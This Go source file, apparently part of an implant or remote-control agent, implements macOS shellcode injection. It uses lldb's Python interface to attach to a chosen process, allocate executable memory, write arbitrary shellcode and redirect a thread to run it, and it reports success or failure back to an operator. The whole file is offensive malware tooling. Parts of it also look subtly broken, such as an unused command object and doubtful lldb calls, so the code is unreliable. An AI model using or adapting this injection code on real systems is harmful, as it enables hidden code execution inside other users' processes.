//go:build darwin

package main

import (
	"fmt"
	"os/exec"
	"runtime"
	"strconv"
)

// injectShellcode on macOS uses a task_for_pid / mach_vm_allocate approach
// which requires SIP to be disabled or running as root with the right entitlements.
// As a practical fallback we use lldb's scripting interface when available.
func injectShellcode(pid int, shellcode []byte) (string, string) {
	if runtime.GOOS != "darwin" {
		return "inject not supported on " + runtime.GOOS, "failed"
	}

	// Check if lldb is available (Xcode dev tools)
	_, err := exec.LookPath("lldb")
	if err != nil {
		return "[!] macOS injection requires lldb (Xcode Command Line Tools) or root + SIP disabled. lldb not found.", "failed"
	}

	// Build a Python one-liner that:
	// 1. Attaches to the process
	// 2. Allocates memory
	// 3. Writes shellcode
	// 4. Calls a thread to execute it
	hexBytes := ""
	for i, b := range shellcode {
		if i > 0 {
			hexBytes += ", "
		}
		hexBytes += fmt.Sprintf("0x%02x", b)
	}

	script := fmt.Sprintf(`
import lldb, struct
debugger = lldb.SBDebugger.Create()
debugger.SetAsync(False)
target = debugger.CreateTarget("")
error = lldb.SBError()
process = target.AttachToProcessWithID(lldb.SBListener(), %d, error)
if not error.Success():
    print("ATTACH_FAIL: " + str(error))
    exit(1)
sc = bytes([%s])
addr = process.AllocateMemory(len(sc), lldb.ePermissionsReadable|lldb.ePermissionsWritable|lldb.ePermissionsExecutable, error)
if not error.Success():
    print("ALLOC_FAIL: " + str(error))
    exit(1)
process.WriteMemory(addr, sc, error)
if not error.Success():
    print("WRITE_FAIL: " + str(error))
    exit(1)
t = process.CreateNewThread()
t.JumpToAddress(addr, error)
process.Continue()
print("INJECT_OK:0x%%x" %% addr)
`, pid, hexBytes)

	cmd := exec.Command("lldb", "--python-path")
	cmd.Stdin = nil
	out, err := exec.Command("lldb", "-o", "script "+script).Output()
	if err != nil {
		return fmt.Sprintf("lldb injection failed: %v\n%s", err, string(out)), "failed"
	}

	output := string(out)
	if contains := func(s, sub string) bool {
		return len(s) >= len(sub) && (s == sub || len(s) > 0 && containsStr(s, sub))
	}; contains(output, "INJECT_OK") {
		return fmt.Sprintf("[+] Injected %d bytes into PID %d via lldb\n%s",
			len(shellcode), pid, output), "completed"
	}

	_ = strconv.Itoa(pid) // suppress unused import
	return fmt.Sprintf("[!] macOS injection output:\n%s", output), "failed"
}

func containsStr(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
